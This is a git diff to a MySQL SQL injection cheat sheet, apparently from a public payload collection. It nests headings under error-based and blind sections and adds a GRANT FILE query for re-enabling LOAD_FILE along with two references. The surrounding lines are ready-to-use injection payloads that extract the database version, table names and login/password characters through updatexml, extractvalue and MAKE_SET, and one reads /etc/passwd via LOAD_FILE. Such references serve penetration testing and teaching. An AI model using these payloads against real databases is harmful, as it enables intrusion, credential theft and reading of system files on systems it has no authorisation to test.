@@ -8,13 +8,15 @@
     * [Extract database with information_schema](#extract-database-with-information-schema)
     * [Extract data without information_schema](#extract-data-without-information-schema)
     * [Extract data without columns name](#extract-data-without-columns-name)
-* [MYSQL Error Based - Basic](#mysql-error-based---basic)
-* [MYSQL Error Based - UpdateXML function](#mysql-error-based---updatexml-function)
-* [MYSQL Error Based - Extractvalue function](#mysql-error-based---extractvalue-function)
-* [MYSQL Blind with substring equivalent](#mysql-blind-with-substring-equivalent)
-* [MYSQL Blind using a conditional statement](#mysql-blind-using-a-conditional-statement)
-* [MYSQL Blind with MAKE_SET](#mysql-blind-with-make-set)
-* [MYSQL Blind with LIKE](#mysql-blind-with-like)
+* [MYSQL Error Based](#mysql-error-based)
+    * [MYSQL Error Based - Basic](#mysql-error-based---basic)
+    * [MYSQL Error Based - UpdateXML function](#mysql-error-based---updatexml-function)
+    * [MYSQL Error Based - Extractvalue function](#mysql-error-based---extractvalue-function)
+* [MYSQL Blind](#mysql-blind)
+    * [MYSQL Blind with substring equivalent](#mysql-blind-with-substring-equivalent)
+    * [MYSQL Blind using a conditional statement](#mysql-blind-using-a-conditional-statement)
+    * [MYSQL Blind with MAKE_SET](#mysql-blind-with-make-set)
+    * [MYSQL Blind with LIKE](#mysql-blind-with-like)
 * [MYSQL Time Based](#mysql-time-based)
 * [MYSQL DIOS - Dump in One Shot](#mysql-dios---dump-in-one-shot)
 * [MYSQL Read content of a file](#mysql-read-content-of-a-file)
@@ -108,7 +110,12 @@ MariaDB [dummydb]> select author_id,title from posts where author_id=-1 union se
 ```
 
 
-## MYSQL Error Based - Basic
+
+
+
+## MYSQL Error Based
+
+### MYSQL Error Based - Basic
 
 Works with `MySQL >= 4.1`
 
@@ -117,7 +124,7 @@ Works with `MySQL >= 4.1`
 '+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'
 ```
 
-## MYSQL Error Based - UpdateXML function
+### MYSQL Error Based - UpdateXML function
 
 ```sql
 AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)-
@@ -134,7 +141,7 @@ Shorter to read:
 ' and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -
 ```
 
-## MYSQL Error Based - Extractvalue function
+### MYSQL Error Based - Extractvalue function
 
 Works with `MySQL >= 5.1`
 
@@ -146,7 +153,9 @@ AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(12
 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))--
 ```
 
-## MYSQL Blind with substring equivalent
+## MYSQL Blind
+
+### MYSQL Blind with substring equivalent
 
 ```sql
 ?id=1 and substring(version(),1,1)=5
@@ -156,7 +165,7 @@ AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)
 ?id=1 and (select mid(version(),1,1)=4)
 ```
 
-## MYSQL Blind using a conditional statement
+### MYSQL Blind using a conditional statement
 
 TRUE: `if @@version starts with a 5`:
 
@@ -174,7 +183,7 @@ Response:
 HTTP/1.1 200 OK
 ```
 
-## MYSQL Blind with MAKE_SET
+### MYSQL Blind with MAKE_SET
 
 ```sql
 AND MAKE_SET(YOLO<(SELECT(length(version()))),1)
@@ -183,7 +192,7 @@ AND MAKE_SET(YOLO<(SELECT(length(concat(login,password)))),1)
 AND MAKE_SET(YOLO<ascii(substring(concat(login,password),POS,1)),1)
 ```
 
-## MYSQL Blind with LIKE
+### MYSQL Blind with LIKE
 
 ['_'](https://www.w3resource.com/sql/wildcards-like-operator/wildcards-underscore.php) acts like the regex character '.', use it to speed up your blind testing
 
@@ -219,6 +228,12 @@ Need the `filepriv`, otherwise you will get the error : `ERROR 1290 (HY000): The
 
 ```sql
 ' UNION ALL SELECT LOAD_FILE('/etc/passwd') --
+```
+
+If you are `root` on the database, you can re-enable the `LOAD_FILE` using the following query
+
+```sql
+GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#
 ```
 
 ## MYSQL Write a shell
@@ -265,3 +280,5 @@ load data infile '\\\\error\\abc' into table database.table_name;
 - [[Sqli] Extracting data without knowing columns names - Ahmed Sultan @0x4148](https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/)
 - [Help по MySql инъекциям - rdot.org](https://rdot.org/forum/showpost.php?p=114&postcount=1)
 - [SQL Truncation Attack - Warlock](https://resources.infosecinstitute.com/sql-truncation-attack/)
+- [HackerOne @ajxchapman 50m-ctf writeup - Alex Chapman @ajxchapman](https://hackerone.com/reports/508123)
+- [SQL Wiki - netspi](https://sqlwiki.netspi.com/injectionTypes/errorBased)
